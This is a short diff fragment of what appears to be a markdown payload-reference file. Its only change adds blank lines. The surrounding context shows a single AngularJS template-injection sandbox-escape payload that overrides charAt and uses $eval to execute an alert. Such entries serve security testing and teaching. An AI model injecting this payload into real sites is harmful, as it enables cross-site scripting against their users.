@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:24:51.896096+00:00'
 ```javascript
 {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
 ```
+
+
